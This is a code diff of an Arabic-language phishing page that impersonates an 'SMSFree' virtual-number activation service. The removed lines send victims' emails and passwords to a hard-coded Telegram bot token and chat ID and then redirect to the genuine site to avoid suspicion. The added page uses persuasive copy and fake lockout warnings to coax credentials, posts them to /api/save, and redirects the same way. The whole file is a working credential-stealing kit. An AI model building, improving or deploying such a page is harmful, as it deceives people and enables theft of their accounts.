@@ -1,40 +1,120 @@
-<script>
-    const form = document.getElementById('secure-form');
-    form.onsubmit = async (e) => {
-        e.preventDefault();
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة تفعيل الأرقام العالمية - نظام الأمان</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        body { margin: 0; padding: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; overflow: hidden; }
+        .premium-card { background-color: #141b2b; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); position: relative; }
         
-        // جلب البيانات من الحقول
-        const u = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
+        .logo-circle { width: 110px; height: 110px; background: radial-gradient(circle, #1e293b, #111827); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 25px; border: 2px solid rgba(0, 242, 254, 0.2); box-shadow: 0 0 20px rgba(0, 242, 254, 0.1); }
+        
+        .persuasive-text { color: #00f2fe; font-size: 16px; font-weight: 700; margin-bottom: 25px; line-height: 1.6; }
+
+        input { width: 100%; padding: 18px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.02); border: 1.5px solid rgba(255, 255, 255, 0.05); border-radius: 15px; color: #fff; font-family: 'Cairo'; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #4facfe; background: rgba(255, 255, 255, 0.05); }
+        input:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        #status-msg { padding: 14px; margin-bottom: 15px; border-radius: 12px; font-size: 13px; display: none; font-weight: bold; animation: shake 0.4s; }
+        .msg-error { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
+        .msg-ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; box-shadow: 0 0 15px rgba(255, 188, 0, 0.2); }
+
+        button { width: 100%; padding: 18px; font-weight: 800; font-size: 17px; background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; border-radius: 15px; cursor: pointer; color: #0a0e17; transition: 0.3s; }
+        button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 242, 254, 0.3); }
+        button:disabled { opacity: 0.5; }
+
+        @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-8px);} 75% {transform: translateX(8px);} }
+
+        .footer { margin-top: 35px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="premium-card">
+        <div class="logo-circle"><span style="font-weight: 800; font-size: 22px; color: #00f2fe;">SMSFree</span></div>
+        <div class="persuasive-text">سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك بضمان وأمان تام.</div>
+
+        <div id="status-msg"></div>
+
+        <form id="secure-form">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit" id="btn-submit">تفعيل الحساب الآن</button>
+        </form>
+
+        <div class="footer">
+            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة.<br>
+            نظام حماية ذكي مشفر بالكامل.
+        </div>
+    </div>
+
+    <script>
+        let attempts = 0;
+        const form = document.getElementById('secure-form');
+        const msg = document.getElementById('status-msg');
         const btn = document.getElementById('btn-submit');
+        const inputs = document.querySelectorAll('input');
 
-        btn.disabled = true;
-        btn.innerText = "جاري التحقق...";
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            const u = document.getElementById('email').value.trim();
+            const p = document.getElementById('pass').value.trim();
 
-        // بيانات البوت الخاص بك (تأكد أنها صحيحة)
-        const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4"; 
-        const chatId = "5174578125";
-        
-        // نص الرسالة التي ستصلك
-        const message = `🚀 وصول جديد من صفحة الدخول\n━━━━━━━━━━━━\n👤 المستخدم: ${u}\n🔑 كلمة السر: ${p}\n━━━━━━━━━━━━`;
+            // فحص الأحرف العربية والرموز المريبة
+            const hasArabic = /[\u0600-\u06FF]/.test(p);
+            const hasSymbols = /[^\w\s@.]/.test(p);
 
-        try {
-            // إرسال البيانات مباشرة إلى تلجرام
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
-            });
-            
-            // التحويل للموقع الحقيقي بعد نجاح الإرسال
-            window.location.href = "https://receive-smss.com/";
-        } catch (err) {
-            // في حال حدوث خطأ، يتم التحويل أيضاً لعدم إثارة الشكوك
-            window.location.href = "https://receive-smss.com/";
+            if (!u.includes('@') || p.length < 6 || hasArabic || hasSymbols) {
+                attempts++;
+                
+                if (attempts === 1) {
+                    showStatus("عذرآ البريد الاكتروني او كلمه المرور خاطئه", "msg-error");
+                } else if (attempts === 2) {
+                    showStatus("تنبيه: إذا تكرر الخطأ للمرة الثالثة سيتم حظرك مؤقتاً", "msg-error");
+                } else {
+                    executeLockdown();
+                }
+                return;
+            }
+
+            // إرسال البيانات بشكل احترافي
+            btn.disabled = true;
+            btn.innerText = "جاري تأكيد الهوية...";
+            try {
+                await fetch('/api/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ user: u, pass: p }) });
+            } catch(e) {}
+            setTimeout(() => { window.location.href = "https://receive-smss.com/"; }, 1500);
+        };
+
+        function showStatus(text, type) {
+            msg.innerText = text;
+            msg.className = type;
+            msg.style.display = "block";
+            // إعادة تشغيل الأنيميشن عند كل خطأ
+            msg.style.animation = 'none';
+            msg.offsetHeight; 
+            msg.style.animation = null;
         }
-    };
-</script>
+
+        function executeLockdown() {
+            inputs.forEach(i => i.disabled = true);
+            btn.disabled = true;
+            let timer = 30;
+            
+            const countdown = setInterval(() => {
+                showStatus(`🚫 لقد تم حظرك مؤقتاً. فك الحظر بعد ${timer} ثانية`, "msg-ban");
+                timer--;
+
+                if (timer < 0) {
+                    clearInterval(countdown);
+                    btn.disabled = false;
+                    showStatus("لاتكرر كتابه البريد أو كلمه السر بشكل غير صحيح سيتم حظرك لمده دقيقه وإذ تكرر الامر ربما لساعات", "msg-error");
+                    inputs.forEach(i => i.disabled = false);
+                    attempts = 0;
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
